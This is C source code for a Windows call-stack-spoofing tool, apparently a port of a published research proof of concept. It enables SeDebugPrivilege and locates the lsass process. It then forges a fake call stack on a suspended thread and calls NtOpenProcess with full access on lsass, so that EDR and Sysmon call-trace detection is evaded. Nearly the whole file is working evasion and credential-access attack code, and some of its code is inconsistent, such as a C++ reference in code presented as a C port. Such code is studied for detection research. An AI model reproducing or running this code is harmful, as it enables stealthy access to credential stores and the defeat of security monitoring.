#include <Windows.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <dbghelp.h>
#include <stdio.h>
#include <winternl.h> // Sometimes required for NTSTATUS and OBJECT_ATTRIBUTES

#pragma comment(lib, "dbghelp.lib")

//#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) == 0)
#define STATUS_SUCCESS    ((NTSTATUS)0x00000000L)
//#define STATUS_DLL_NOT_FOUND ((NTSTATUS)0xC0000135L)
//#define STATUS_ASSERTION_FAILURE ((NTSTATUS)0xC0000420L)

#define MAX_STACK_FRAMES 20
#define MAX_CACHE_ENTRIES 50
#define RBP_OP_INFO 0x5
#define MAX_STACK_SIZE 0x3000 // 12288 bytes

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

// --- Structures ---
/*
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
 */

typedef struct _UNWIND_CODE {
    BYTE CodeOffset;
    BYTE UnwindOp : 4;
    BYTE OpInfo : 4;
} UNWIND_CODE, *PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE Version : 3;
    BYTE Flags : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[1];
/* UNWIND_CODE MoreUnwindCode[((CountOfCodes + 1) & ~1) - 1];
* union {
* OPTIONAL ULONG ExceptionHandler;
* OPTIONAL ULONG FunctionEntry;
* };
* OPTIONAL ULONG ExceptionData[]; */
} UNWIND_INFO, *PUNWIND_INFO; 

typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL = 0,
    UWOP_ALLOC_LARGE,
    UWOP_ALLOC_SMALL,
    UWOP_SET_FPREG,
    UWOP_SAVE_NONVOL,
    UWOP_SAVE_NONVOL_FAR,
    UWOP_SAVE_XMM128 = 8,
    UWOP_SAVE_XMM128_FAR,
    UWOP_PUSH_MACHFRAME
} UNWIND_CODE_OPS;

typedef struct _StackFrame {
    WCHAR targetDll[MAX_PATH];
    ULONG offset;
    ULONG totalStackSize;
    BOOL requiresLoadLibrary;
    BOOL setsFramePointer;
    PVOID returnAddress;
    BOOL pushRbp;
    ULONG countOfCodes;
    ULONG pushRbpIndex;
} StackFrame;

typedef struct _ImageBaseEntry {
    WCHAR dllPath[MAX_PATH];
    HMODULE hModule;
} ImageBaseEntry;

typedef struct _StackProfileEntry {
    WCHAR modulePath[MAX_PATH];
    char functionName[64];
    ULONG offsetFromExport;
    BOOL needLoad;
} StackProfileEntry;

// --- Global Cache (Replacing std::map) ---
ImageBaseEntry g_ImageBaseCache[MAX_CACHE_ENTRIES];
int g_CacheCount = 0;

// --- Helper Functions ---

HMODULE GetCachedImageBase(const WCHAR* dllPath) {
    for (int i = 0; i < g_CacheCount; i++) {
        if (_wcsicmp(g_ImageBaseCache[i].dllPath, dllPath) == 0) {
            return g_ImageBaseCache[i].hModule;
        }
    }
    return NULL;
}

void CacheImageBase(const WCHAR* dllPath, HMODULE hModule) {
    if (g_CacheCount < MAX_CACHE_ENTRIES) {
        wcscpy_s(g_ImageBaseCache[g_CacheCount].dllPath, MAX_PATH, dllPath);
        g_ImageBaseCache[g_CacheCount].hModule = hModule;
        g_CacheCount++;
    }
}

DWORD GetRvaFromName(HMODULE hModule, const char* functionName) {
    PBYTE base = (PBYTE)hModule;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(base + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDirInfo = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    
    if (exportDirInfo.Size == 0) return 0;

    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(base + exportDirInfo.VirtualAddress);
    PDWORD addressOfFunctions = (PDWORD)(base + exportDirectory->AddressOfFunctions);
    PDWORD addressOfNames = (PDWORD)(base + exportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinals = (PWORD)(base + exportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        char* currentName = (char*)(base + addressOfNames[i]);
        if (strcmp(currentName, functionName) == 0) {
            return addressOfFunctions[addressOfNameOrdinals[i]];
        }
    }
    return 0;
}

// --- Stack Calculation Logic ---

NTSTATUS CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase, StackFrame* stackFrame) {
    PUNWIND_INFO pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    ULONG index = 0;

    while (index < pUnwindInfo->CountOfCodes) {
        ULONG unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        ULONG operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;

        switch (unwindOperation) {
            case UWOP_PUSH_NONVOL:
                stackFrame->totalStackSize += 8;
                // Check if the register being pushed is RBP
                if (operationInfo == 5) { // 5 is the constant for RBP
                    stackFrame->pushRbp = TRUE;
                    stackFrame->countOfCodes = pUnwindInfo->CountOfCodes;
                    stackFrame->pushRbpIndex = index + 1;
                }
                break;

            case UWOP_SAVE_NONVOL:
            case UWOP_SAVE_XMM128:
                index++; // These use 2 slots
                break;

            case UWOP_SAVE_NONVOL_FAR:
            case UWOP_SAVE_XMM128_FAR:
                index += 2; // These use 3 slots
                break;

            case UWOP_ALLOC_SMALL:
                stackFrame->totalStackSize += ((operationInfo * 8) + 8);
                break;

            case UWOP_ALLOC_LARGE:
            {
                index++;
                // Ensure this member matches your struct definition (OpInfo or UnwindValue)
                ULONG frameOffset = pUnwindInfo->UnwindCode[index].OpInfo; 
                if (operationInfo == 0) {
                    frameOffset *= 8;
                } else {
                    index++;
                    frameOffset += (pUnwindInfo->UnwindCode[index].OpInfo << 16);
                }
                stackFrame->totalStackSize += frameOffset;
                break;
            }

            case UWOP_SET_FPREG:
                stackFrame->setsFramePointer = TRUE;
                break;

            default:
                break;
        }
        index++;
    }

    // Handle Chained Unwind Info
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO)) {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1)) index++;
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);
    }

    stackFrame->totalStackSize += 8; // Add return address size
    return STATUS_SUCCESS;
}

NTSTATUS CalculateFunctionStackSizeWrapper(StackFrame* stackFrame) {
    DWORD64 ImageBase = 0;
    PRUNTIME_FUNCTION pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)stackFrame->returnAddress, &ImageBase, NULL);
    
    if (NULL == pRuntimeFunction) return STATUS_ASSERTION_FAILURE;

    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);
}

// --- Profile Generator ---

void BuildDynamicStack(const StackProfileEntry* blueprint, int blueprintSize, StackFrame* outStack, int* outFrameCount) {
    *outFrameCount = 0;
    for (int i = 0; i < blueprintSize; i++) {
        HMODULE hMod = GetModuleHandleW(blueprint[i].modulePath);
        if (!hMod || blueprint[i].needLoad) {
            hMod = LoadLibraryW(blueprint[blueprint[i].needLoad ? i : i].modulePath);
        }

        if (hMod) {
            DWORD funcRva = GetRvaFromName(hMod, blueprint[i].functionName);
            if (funcRva != 0) {
                StackFrame* frame = &outStack[*outFrameCount];
                memset(frame, 0, sizeof(StackFrame));
                
                wcscpy_s(frame->targetDll, MAX_PATH, blueprint[i].modulePath);
                frame->offset = funcRva + blueprint[i].offsetFromExport;
                frame->requiresLoadLibrary = blueprint[i].needLoad;
                frame->returnAddress = (PBYTE)hMod + frame->offset;

                if (NT_SUCCESS(CalculateFunctionStackSizeWrapper(frame))) {
                    printf("[+] Resolved %ls!%s to RVA: %lX (Size: %lu)\n", 
                        blueprint[i].modulePath, blueprint[i].functionName, frame->offset, frame->totalStackSize);
                    (*outFrameCount)++;
                }
            }
        }
    }
}

//
// Sets the specified privilege in the current process access token.
// Based on:
// https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
//
BOOL SetPrivilege(
    const LPCTSTR lpszPrivilege,
    const BOOL bEnablePrivilege
)
{
    TOKEN_PRIVILEGES tp = {};
    LUID luid = {};
    HANDLE hToken = NULL;

    // [1] Obtain handle to process token.
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        printf("[-] Failed to OpenProcessToken \n");
        return FALSE;
    }

    // [2] Look up supplied privilege value and set if required.
    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
        printf("[-] SetPrivilege failed: LookupPrivilegeValue error %u", GetLastError());
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
    {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else
    {
        tp.Privileges[0].Attributes = 0;
    }

    // [3] Enable the privilege or disable all privileges.
    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("[-] AdjustTokenPrivileges failed: LookupPrivilegeValue error %u", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        printf("[-] SetPrivilege failed: LookupPrivilegeValue error\n");
        return FALSE;
    }

    return TRUE;
}

//
// Dummy function used as start address for spoofed thread.
//
DWORD DummyFunction(LPVOID lpParam)
{
    printf("[+] Hello from dummy function!\n");
    return 0;
}

//
// Handles the inevitable crash of the fake thread and redirects
// it to gracefully exit via RtlExitUserThread.
//
LONG CALLBACK VehCallback(PEXCEPTION_POINTERS ExceptionInfo)
{
    ULONG exceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;

    // [0] If unrelated to us, keep searching.
    if (exceptionCode != STATUS_ACCESS_VIOLATION) return EXCEPTION_CONTINUE_SEARCH;

    // [1] Handle access violation error by gracefully exiting thread.
    if (exceptionCode == STATUS_ACCESS_VIOLATION)
    {
        printf("[+] VEH Exception Handler called \n");
        printf("[+] Re-directing spoofed thread to RtlExitUserThread \n");
        ExceptionInfo->ContextRecord->Rip = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");
        ExceptionInfo->ContextRecord->Rcx = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_EXECUTION;
}

//
// Retrieves the pid of the lsass process.
//
NTSTATUS GetLsassPid(DWORD *pid)
{
    PROCESSENTRY32W processEntry = { sizeof(PROCESSENTRY32W) }; // Use W version
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (INVALID_HANDLE_VALUE == snapshot) return STATUS_ASSERTION_FAILURE;

    if (Process32FirstW(snapshot, &processEntry))
    {
        do {
            if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0)
            {
                *pid = processEntry.th32ProcessID;
                CloseHandle(snapshot);
                return STATUS_SUCCESS;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return STATUS_DLL_NOT_FOUND;
}

//
// Pushes a value to the stack of a Context structure.
//
void PushToStack(CONTEXT &Context, const ULONG64 value)
{
    Context.Rsp -= 0x8;
    PULONG64 AddressToWrite = (PULONG64)(Context.Rsp);
    *AddressToWrite = value;
}

// Helper function to simulate a 'push' onto the suspended thread's stack
void PushToStack(CONTEXT* context, ULONG64 value) {
    context->Rsp -= sizeof(ULONG64);
    *(ULONG64*)(context->Rsp) = value;
}

// Initialises the spoofed thread state before it begins
// to execute by building a fake call stack via modifying
// rsp and appropriate stack data.
void InitialiseFakeThreadState(CONTEXT* context, StackFrame* targetCallStack, int frameCount)
{
    ULONG64 childSp = 0;
    BOOL bPreviousFrameSetUWOP_SET_FPREG = FALSE;

    // [1] Explicitly clear the last RET address to stop any further unwinding.
    // context is now a pointer, so we use ->
    PushToStack(context, 0);

    // [2] Loop through target call stack *backwards*
    // In C, we use a standard for loop starting at (frameCount - 1)
    for (int i = frameCount - 1; i >= 0; i--)
    {
        StackFrame* currentFrame = &targetCallStack[i];

        // [2.1] Check if the last frame set UWOP_SET_FPREG.
        if (bPreviousFrameSetUWOP_SET_FPREG && currentFrame->pushRbp)
        {
            // [2.2] Calculate how many non-volatiles were pushed before RBP
            ULONG diff = currentFrame->countOfCodes - currentFrame->pushRbpIndex;
            ULONG tmpStackSizeCounter = 0;

            for (ULONG j = 0; j < diff; j++)
            {
                // e.g. push rbx
                PushToStack(context, 0x0);
                tmpStackSizeCounter += 0x8;
            }

            // push rbp (writing the childSp required for the frame pointer)
            PushToStack(context, childSp);

            // [2.3] Subtract the remaining function stack size
            context->Rsp -= (currentFrame->totalStackSize - (tmpStackSizeCounter + 0x8));
            PULONG64 fakeRetAddress = (PULONG64)(context->Rsp);
            *fakeRetAddress = (ULONG64)currentFrame->returnAddress;

            bPreviousFrameSetUWOP_SET_FPREG = FALSE;
        }
        else
        {
            // [3] Standard frame handling
            context->Rsp -= currentFrame->totalStackSize;
            PULONG64 fakeRetAddress = (PULONG64)(context->Rsp);
            *fakeRetAddress = (ULONG64)currentFrame->returnAddress;
        }

        // [4] Check for UWOP_SET_FPREG (mov rsp, rbp)
        if (currentFrame->setsFramePointer)
        {
            childSp = context->Rsp;
            childSp += 0x8;
            bPreviousFrameSetUWOP_SET_FPREG = TRUE;
        }
    }
}

// --- Main Execution ---

int main(int argc, char* argv[])
{
    // ASCII Art - Replaced std::cout with printf
    printf(
        "\n"
        "                             $$\\                                                                                    \n"
        "                             $$ |                                                                                   \n"
        "        $$\\    $$\\ $$\\   $$\\ $$ | $$$$$$$\\ $$$$$$\\  $$$$$$$\\          $$$$$$\\  $$$$$$\\ $$\\    $$\\  $$$$$$\\  $$$$$$$\\ \n"
        "        \\$$\\  $$  |$$ |  $$ |$$ |$$  _____|\\____$$\\ $$  __$$\\        $$  __$$\\ \\____$$\\\\$$\\  $$  |$$  __$$\\ $$  __$$\\\n"
        "         \\$$\\$$  / $$ |  $$ |$$ |$$ /       $$$$$$$ |$$ |  $$ |      $$ |  \\__|$$$$$$$ |\\$$\\$$  / $$$$$$$$ |$$ |  $$ |\n"
        "          \\$$$  /  $$ |  $$ |$$ |$$ |      $$  __$$ |$$ |  $$ |      $$ |      $$  __$$ | \\$$$  /  $$  ____|$$ |  $$ |\n"
        "           \\$  /   \\$$$$$$  |$$ |\\$$$$$$$\\$$$$$$$ |$$ |  $$ |      $$ |      \\$$$$$$$ |  \\$  /   \\$$$$$$$\\ $$ |  $$ |\n"
        "            \\_/     \\______/ \\__| \\_______|\\_______|\\__|  \\__|      \\__|      \\_______|   \\_/     \\_______|\\__|  \\__|\n"
        "\n"
        "                                       Call Stack Spoofer            William Burgess @joehowwolf\n\n"
    );

    NTSTATUS status = STATUS_SUCCESS;
    StackFrame targetCallStack[MAX_STACK_FRAMES];
    int frameCount = 0;
    
    DWORD dwThreadId = 0;
    HANDLE hThread = 0;
    CONTEXT context = { 0 };
    PVOID pHandler = NULL;
    BOOL ret = FALSE;
    DWORD suspendCount = 0;

    // Args for NtOpenProcess
    OBJECT_ATTRIBUTES objectAttr;
    CLIENT_ID clientId;
    DWORD lsassPid = 0;
    HANDLE hLsass = 0;

    // [0] Handle command line args
    // Replacing the std::vector logic with our C BuildDynamicStack or static array copy
    if (argc < 2 || strcmp(argv[1], "--svchost") == 0)
    {
        printf("[+] Target call stack profile to spoof is svchost (Dynamic Resolution)\n");
        // Use the blueprint we defined in the previous snippet
        StackProfileEntry svchostBlueprint[] = {
            { L"C:\\Windows\\System32\\kernelbase.dll", "CtrlRoutine", 0x22, FALSE },
            { L"C:\\Windows\\System32\\ntdll.dll", "TpReleaseCleanupGroupMembers", 0x450, FALSE },
            { L"C:\\Windows\\System32\\kernel32.dll", "BaseThreadInitThunk", 0x14, FALSE },
            { L"C:\\Windows\\System32\\ntdll.dll", "RtlUserThreadStart", 0x21, FALSE }
        };
        BuildDynamicStack(svchostBlueprint, 4, targetCallStack, &frameCount);
    }
    else if (strcmp(argv[1], "--wmi") == 0)
    {
        printf("[+] Target call stack profile to spoof is wmi\n");
        // You would populate targetCallStack here with WMI offsets
    }
    else if (strcmp(argv[1], "--rpc") == 0)
    {
        printf("[+] Target call stack profile to spoof is rpc\n");
        // You would populate targetCallStack here with RPC offsets
    }
    else
    {
        printf("[-] Error: Incorrect argument provided. Options: --wmi, --rpc, --svchost\n");
        return -1;
    }

    if (frameCount == 0)
    {
        printf("[-] Error: Failed to resolve any frames for the target stack.\n");
        return -1;
    }

    // [1] Note: InitialiseSpoofedCallstack was merged into BuildDynamicStack for the C port
    // as it handles the RVA resolution and stack size calculation in one pass.

    // [2] Enable SeDebugPrivilege
    if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
    {
        printf("[-] Failed to enable SeDebugPrivilege; try re-running as admin\n");
        return -1;
    }

    // [3] Create suspended thread
    hThread = CreateThread(
        NULL,
        MAX_STACK_SIZE, // 12000 as defined in your header
        (LPTHREAD_START_ROUTINE)DummyFunction,
        NULL,
        CREATE_SUSPENDED,
        &dwThreadId);

    if (!hThread)
    {
        printf("[-] Failed to create suspended thread (Error: %lu)\n", GetLastError());
        return -1;
    }
    printf("[+] Created suspended thread: %lu\n", dwThreadId);

    // [4] Obtain context struct
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &context))
    {
        printf("[-] Failed to get thread context\n");
        return -1;
    }

    // [5.1] Initialise fake thread state
    printf("[+] Initialising spoofed thread state...\n");
    // Passing our C array
    InitialiseFakeThreadState(&context, targetCallStack, frameCount);

    // [5.2] Set arguments for NtOpenProcess
    context.Rcx = (DWORD64)&hLsass;
    context.Rdx = (DWORD64)PROCESS_ALL_ACCESS;

    // Initialize Object Attributes
    InitializeObjectAttributes(&objectAttr, NULL, 0, NULL, NULL);
    context.R8 = (DWORD64)&objectAttr;

    // Get LSASS PID and setup ClientID
    if (!NT_SUCCESS(GetLsassPid(&lsassPid))) {
        printf("[-] Failed to find LSASS PID\n");
        return -1;
    }
    clientId.UniqueProcess = (HANDLE)(DWORD_PTR)lsassPid;
    clientId.UniqueThread = 0;
    context.R9 = (DWORD64)&clientId;

    // Set RIP to NtOpenProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    context.Rip = (DWORD64)GetProcAddress(hNtdll, "NtOpenProcess");

    // [5.3] Set thread context
    if (!SetThreadContext(hThread, &context))
    {
        printf("[-] Failed to set thread context\n");
        return -1;
    }

    // [6] Register VEH
    pHandler = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)VehCallback);
    if (!pHandler)
    {
        printf("[-] Failed to add vectored exception handler\n");
        return -1;
    }

    // [7] Resume Thread
    printf("[+] Resuming suspended thread...\n");
    suspendCount = ResumeThread(hThread);
    if (suspendCount == (DWORD)-1)
    {
        printf("[-] Failed to resume thread\n");
        return -1;
    }

    // [8] Sleep briefly
    printf("[+] Sleeping for 5 seconds to allow thread execution...\n");
    Sleep(5000);

    // [9] Results
    if (!hLsass)
    {
        printf("[-] Error: Failed to obtain handle to lsass. Check your RVAs and stack alignment.\n");
    }
    else
    {
        printf("[+] Successfully obtained handle to lsass [0x%p] with spoofed callstack!\n", hLsass);
        printf("[+] Check SysMon event logs (Event ID 10) to verify the CallTrace.\n");
        CloseHandle(hLsass);
    }

    if (hThread) CloseHandle(hThread);
    if (pHandler) RemoveVectoredExceptionHandler(pHandler);

    return 0;
}
